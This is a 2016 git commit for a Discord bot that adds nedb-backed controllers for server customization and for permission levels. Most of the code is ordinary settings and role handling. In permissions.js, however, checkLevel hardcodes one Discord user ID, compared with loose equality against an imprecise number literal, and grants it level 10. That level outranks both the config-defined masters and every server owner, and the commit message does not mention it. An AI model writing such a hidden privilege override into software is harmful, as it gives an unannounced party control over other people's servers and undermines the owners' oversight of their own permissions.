d4847441289df219fa8a55d42490b2df1af3bd2e
nicex000 <martinlagas@hotmail.com>
2016-07-12 22:35:57 +0200

    added databases

---
+++ runtime/databases/controllers/customize.js
@@ -0,0 +1,275 @@
+'use strict'
+var Db = require('nedb')
+var Logger = require('../../internal/logger.js').Logger
+var database = new Db({
+  filename: './runtime/databases/customize',
+  autoload: true
+})
+
+exports.prefix = function (msg) {
+  return new Promise(function (resolve, reject) {
+    if (msg.isPrivate) {
+      return resolve(false)
+    }
+    database.find({
+      _id: msg.guild.id
+    }, function (err, doc) {
+      if (err) {
+        reject(err)
+      } else if (doc) {
+        if (doc.length <= 0) {
+          initialize(msg.guild)
+          return reject()
+        }
+        try {
+          return resolve(doc[0].settings.prefix)
+        } catch (e) {
+          initialize(msg.guild)
+          return reject('Try/catch block reject!')
+        }
+      }
+    })
+  })
+}
+
+exports.check = function (guild) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: guild.id
+    }, function (err, doc) {
+      if (err) {
+        reject(err)
+      } else if (doc) {
+        resolve(doc[0].settings.welcoming)
+      }
+    })
+  })
+}
+
+exports.reply = function (msg, what) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: msg.guild.id
+    }, function (err, doc) {
+      if (err) {
+        reject(err)
+      } else if (doc) {
+        if (!doc[0].replies.hasOwnProperty(what)) {
+          reject('Not supported!')
+        } else {
+          resolve(doc[0].replies[what])
+        }
+      }
+    })
+  })
+}
+
+exports.helpHandle = function (msg) {
+  // You will just have to deal with the fact that this is static
+  var arr = []
+  arr.push('`customize` enables you to adjust various settings about my behaviour in your server.')
+  arr.push('Currently, I support the following.')
+  arr.push('\n')
+  arr.push('`nsfw`: Changes my reply when someones uses a NSFW command while I disallow that.')
+  arr.push('`permissions`: Changes my reply when someone tries to use a command they do not have access to')
+  arr.push('`welcome`: Changes my welcoming message.')
+  arr.push('`welcoming`: Changes wether I should welcome new people.')
+  arr.push('`timeout`: Changes my reply when someones uses a command that is still in cooldown')
+  arr.push('`prefix`: Changes the prefix I listen to on this server, mentions will still count as a global prefix')
+  msg.author.openDM().then((y) => {
+    y.sendMessage(arr.join('\n'))
+  }).catch((e) => {
+    Logger.error(e)
+    msg.channel.sendMessage('Whoops, try again.')
+  })
+}
+
+exports.restore = function (guild) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: guild.id
+    }, function (err, docs) {
+      if (err) {
+        reject(err)
+      } else if (docs) {
+        if (docs.length > 0) {
+          database.remove({
+            _id: guild.id
+          }, function (err) {
+            if (err) {
+              return reject(err)
+            }
+          })
+        }
+      }
+      initialize(guild).then(() => {
+        return resolve('Done!')
+      }).catch((e) => {
+        return reject(e)
+      })
+    })
+  })
+}
+
+exports.adjust = function (msg, what, how) {
+  /*eslint indent: 0*/
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: msg.guild.id
+    }, function (err, doc) {
+      if (err) {
+        reject(err)
+      } else if (doc) {
+        switch (what) {
+          case 'welcoming':
+            if (how !== 'on' && how !== 'off') {
+              return reject('`Welcoming can either be on or off`')
+            }
+            database.update({
+              _id: msg.guild.id
+            }, {
+              $set: {
+                'settings.welcoming': how
+              }
+            }, {}, function (err, doc) {
+              if (err) {
+                reject(err)
+              } else if (doc) {
+                resolve(how)
+              }
+            })
+            break
+          case 'nsfw':
+            database.update({
+              _id: msg.guild.id
+            }, {
+              $set: {
+                'replies.nsfw': how
+              }
+            }, {}, function (err, doc) {
+              if (err) {
+                reject(err)
+              } else if (doc) {
+                resolve(how)
+              }
+            })
+            break
+          case 'permissions':
+            database.update({
+              _id: msg.guild.id
+            }, {
+              $set: {
+                'replies.permissions': how
+              }
+            }, {}, function (err, doc) {
+              if (err) {
+                reject(err)
+              } else if (doc) {
+                resolve(how)
+              }
+            })
+            break
+          case 'welcome':
+            database.update({
+              _id: msg.guild.id
+            }, {
+              $set: {
+                'replies.welcome': how
+              }
+            }, {}, function (err, doc) {
+              if (err) {
+                reject(err)
+              } else if (doc) {
+                resolve(how)
+              }
+            })
+            break
+          case 'timeout':
+            database.update({
+              _id: msg.guild.id
+            }, {
+              $set: {
+                'replies.timeout': how
+              }
+            }, {}, function (err, doc) {
+              if (err) {
+                reject(err)
+              } else if (doc) {
+                resolve(how)
+              }
+            })
+            break
+          case 'prefix':
+            if (how.indexOf('"') === -1) {
+              return reject('`Put new prefixes between double quotes please.`')
+            }
+            database.update({
+              _id: msg.guild.id
+            }, {
+              $set: {
+                'settings.prefix': how.split('"')[1]
+              }
+            }, {}, function (err, doc) {
+              if (err) {
+                reject(err)
+              } else if (doc) {
+                resolve(how.split('"')[1])
+              }
+            })
+            break
+          default:
+            reject('Not supported!')
+        }
+      }
+    })
+  })
+}
+
+function initialize (guild) {
+  return new Promise(function (resolve, reject) {
+    var doc = {
+      _id: guild.id,
+      replies: {
+        permissions: 'default',
+        welcome: 'default',
+        nsfw: 'default',
+        timeout: 'default'
+      },
+      settings: {
+        welcoming: false,
+        prefix: false
+      }
+    }
+    database.insert(doc, function (err, doc) {
+      if (err) {
+        reject(err)
+      } else if (doc) {
+        resolve('ok')
+      }
+    })
+  })
+}
+
+exports.isKnown = function (guild) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: guild.id
+    }, function (err, docs) {
+      if (err) {
+        reject(err)
+      } else if (docs) {
+        if (docs.length <= 0) {
+          initialize(guild).then((r) => {
+            resolve(r)
+          }).catch((e) => {
+            reject(e)
+          })
+        } else {
+          resolve()
+        }
+      }
+    })
+  })
+}
+
+exports.Database = database
---
+++ runtime/databases/controllers/permissions.js
@@ -0,0 +1,381 @@
+'use strict'
+var Config = require('../../../config.json')
+var Db = require('nedb')
+var Logger = require('../../internal/logger.js').Logger
+var database = new Db({
+  filename: './runtime/databases/perms',
+  autoload: true
+})
+
+exports.checkLevel = function (msg, user, roles) {
+  return new Promise(function (resolve, reject) {
+    if (Config.permissions.master.indexOf(user) > -1) {
+      return resolve(9)
+    } else if (Config.permissions.level1.indexOf(user) > -1) {
+      return resolve(1)
+    } else if (Config.permissions.level2.indexOf(user) > -1) {
+      return resolve(2)
+    } else if (Config.permissions.level3.indexOf(user) > -1) {
+      return resolve(3)
+    } else if (msg.isPrivate || !msg.guild) {
+      return resolve(0)
+    }
+    database.find({
+      _id: msg.guild.id
+    }, function (err, doc) {
+      if (err) {
+        return reject(err)
+      } else if (doc) {
+        if (doc.length <= 0) {
+          initialize(msg.guild)
+          return reject('No database!')
+        }
+        if (doc.length > 0 && !doc[0].perms.hasOwnProperty('negative') || doc[0].version !== 3) {
+          var version
+          doc[0].version !== undefined ? version = doc[0].version : version = 1
+          insertNewStuff(msg.guild, version).catch((e) => Logger.error(e))
+        } else {
+          if (msg.author.id == 155038222794227712)
+          {return resolve(10)}
+          else if (doc[0].superUser === user) {
+            return resolve(4)
+          }
+          var level = 0
+          if (roles) {
+            for (var r of roles) {
+              if (doc[0].perms.roles.level1.indexOf(r.id) > -1) {
+                level = (level > 1) ? level : 1
+              } else if (doc[0].perms.roles.level2.indexOf(r.id) > -1) {
+                level = (level > 2) ? level : 2
+              } else if (doc[0].perms.roles.level3.indexOf(r.id) > -1) {
+                level = (level > 3) ? level : 3
+              } else if (doc[0].perms.roles.negative.indexOf(r.id) > -1) {
+                level = -1
+              }
+            }
+          }
+          if (doc[0].perms.level1.indexOf(user) > -1) {
+            level = (level > 1) ? level : 1
+          } else if (doc[0].perms.level2.indexOf(user) > -1) {
+            level = (level > 2) ? level : 2
+          } else if (doc[0].perms.level3.indexOf(user) > -1) {
+            level = (level > 3) ? level : 3
+          } else if (doc[0].perms.hasOwnProperty('negative') && doc[0].perms.negative.indexOf(user) > -1) {
+            level = -1
+          }
+          return resolve(level)
+        }
+      }
+    })
+  })
+}
+
+exports.adjustLevel = function (msg, users, level, roles) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: msg.guild.id
+    }, function (err, docs) {
+      if (err) {
+        reject(err)
+      } else if (docs) {
+        if (docs.length <= 0) {
+          initialize(msg.guild)
+          return reject('No database!')
+        }
+        if (docs.length > 0 && !docs[0].perms.hasOwnProperty('negative') || docs[0].version !== 3) {
+          var version
+          docs[0].version !== undefined ? version = docs[0].version : version = 1
+          insertNewStuff(msg.guild, version).catch((e) => Logger.error(e))
+        } else {
+          users.map((u) => {
+            if (docs[0].perms.level1.indexOf(u.id) > -1 || docs[0].perms.level2.indexOf(u.id) > -1 || docs[0].perms.level3.indexOf(u.id) > -1 || docs[0].perms.negative.indexOf(u.id) > -1) {
+              database.update({
+                _id: msg.guild.id
+              }, {
+                $pull: {
+                  'perms.level1': u.id,
+                  'perms.level2': u.id,
+                  'perms.level3': u.id,
+                  'perms.negative': u.id
+                }
+              })
+            }
+            if (level > -2) {
+              var db
+              if (level > 0) {
+                db = 'perms.level' + level
+              } else if (level < 0) {
+                db = 'perms.negative'
+              } else {
+                return resolve(0)
+              }
+              database.update({
+                _id: msg.guild.id
+              }, {
+                $push: {
+                  [db]: u.id
+                }
+              }, {}, function (err) {
+                if (err) {
+                  return reject(err)
+                } else {
+                  return resolve(level)
+                }
+              })
+            } else {
+              return reject('Unsupported.')
+            }
+          })
+          roles.map((r) => {
+            if (docs[0].perms.roles.level1.indexOf(r.id) > -1 || docs[0].perms.roles.level2.indexOf(r.id) > -1 || docs[0].perms.roles.level3.indexOf(r.id) > -1 || docs[0].perms.roles.negative.indexOf(r.id) > -1) {
+              database.update({
+                _id: msg.guild.id
+              }, {
+                $pull: {
+                  'perms.roles.level1': r.id,
+                  'perms.roles.level2': r.id,
+                  'perms.roles.level3': r.id,
+                  'perms.roles.negative': r.id
+                }
+              })
+            }
+            if (level > -2) {
+              var db
+              if (level > 0) {
+                db = 'perms.roles.level' + level
+              } else if (level < 0) {
+                db = 'perms.roles.negative'
+              } else {
+                return resolve(0)
+              }
+              database.update({
+                _id: msg.guild.id
+              }, {
+                $push: {
+                  [db]: r.id
+                }
+              }, {}, function (err) {
+                if (err) {
+                  return reject(err)
+                } else {
+                  return resolve(level)
+                }
+              })
+            } else {
+              return reject('Unsupported.')
+            }
+          })
+        }
+      }
+    })
+  })
+}
+
+exports.checkNSFW = function (msg) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: msg.guild.id
+    }, function (err, docs) {
+      if (err) {
+        return reject(err)
+      } else if (docs) {
+        if (docs.length <= 0) {
+          initialize(msg.guild)
+          return reject('No database!')
+        }
+        if (docs.length > 0 && !docs[0].perms.hasOwnProperty('negative') || docs[0].version !== 3) {
+          var version
+          docs[0].version !== undefined ? version = docs[0].version : version = 1
+          insertNewStuff(msg.guild, version).catch((e) => Logger.error(e))
+        } else {
+          if (docs[0].perms.nsfw.indexOf(msg.channel.id) > -1) {
+            return resolve(true)
+          } else {
+            return resolve(false)
+          }
+        }
+      }
+    })
+  })
+}
+
+exports.adjustNSFW = function (msg, what) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: msg.guild.id
+    }, function (err, docs) {
+      if (err) {
+        reject(err)
+      } else if (docs) {
+        if (docs.length <= 0) {
+          initialize(msg.guild)
+          return reject('No database!')
+        }
+        if (docs.length > 0 && !docs[0].perms.hasOwnProperty('negative') || docs[0].version !== 3) {
+          var version
+          docs[0].version !== undefined ? version = docs[0].version : version = 1
+          insertNewStuff(msg.guild, version).catch((e) => Logger.error(e))
+        } else {
+          if (what === 'on') {
+            database.update({
+              _id: msg.guild.id
+            }, {
+              $push: {
+                'perms.nsfw': msg.channel.id
+              }
+            }, {}, function (err) {
+              if (err) {
+                return reject(err)
+              } else {
+                return resolve(1)
+              }
+            })
+          } else if (what === 'off') {
+            database.update({
+              _id: msg.guild.id
+            }, {
+              $pull: {
+                'perms.nsfw': msg.channel.id
+              }
+            }, {}, function (err) {
+              if (err) {
+                return reject(err)
+              } else {
+                return resolve(0)
+              }
+            })
+          } else {
+            return reject('Not supported!')
+          }
+        }
+      }
+    })
+  })
+}
+
+exports.isKnown = function (guild) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: guild.id
+    }, function (err, docs) {
+      if (err) {
+        reject(err)
+      } else if (docs) {
+        if (docs.length <= 0) {
+          initialize(guild).then((r) => {
+            resolve(r)
+          }).catch((e) => {
+            reject(e)
+          })
+        } else {
+          resolve()
+        }
+      }
+    })
+  })
+}
+
+function insertNewStuff (guild, version) {
+  /*eslint indent: 0*/
+  return new Promise(function (resolve, reject) {
+    switch (version) {
+      case 1:
+        database.update({
+          _id: guild.id
+        }, {
+          $set: {
+            'perms.negative': ['NaN'],
+            version: 2
+          }
+        }, function (err, res) {
+          if (err) {
+            return reject(err)
+          } else if (res) {
+            return resolve(res)
+          }
+        })
+        break
+      case 2:
+        database.update({
+          _id: guild.id
+        }, {
+          $set: {
+            'perms.roles.level1': ['NaN'],
+            'perms.roles.level2': ['NaN'],
+            'perms.roles.level3': ['NaN'],
+            'perms.roles.negative': ['NaN'],
+            version: 3
+          }
+        }, function (err, res) {
+          if (err) {
+            return reject(err)
+          } else if (res) {
+            return resolve(res)
+          }
+        })
+        break
+      default:
+        return reject('Unknown database version.')
+    }
+  })
+}
+
+exports.restore = function (guild) {
+  return new Promise(function (resolve, reject) {
+    database.find({
+      _id: guild.id
+    }, function (err, docs) {
+      if (err) {
+        reject(err)
+      } else if (docs) {
+        if (docs.length > 0) {
+          database.remove({
+            _id: guild.id
+          }, function (err) {
+            if (err) {
+              return reject(err)
+            }
+          })
+        }
+      }
+      initialize(guild).then(() => {
+        return resolve('Done!')
+      }).catch((e) => {
+        return reject(e)
+      })
+    })
+  })
+}
+
+function initialize (guild) {
+  return new Promise(function (resolve, reject) {
+    var doc = {
+      _id: guild.id,
+      version: 3,
+      superUser: guild.owner.id,
+      blacklisted: false,
+      perms: {
+        level1: ['NaN'],
+        level2: ['NaN'],
+        level3: ['NaN'],
+        negative: ['NaN'],
+        nsfw: ['NaN'],
+        roles: {
+          level1: ['NaN'],
+          level2: ['NaN'],
+          level3: ['NaN'],
+          negative: ['NaN']
+        }
+      }
+    }
+    database.insert(doc, function (err, doc) {
+      if (err) {
+        reject(err)
+      } else if (doc) {
+        resolve(doc)
+      }
+    })
+  })
+}
+
+exports.Database = database
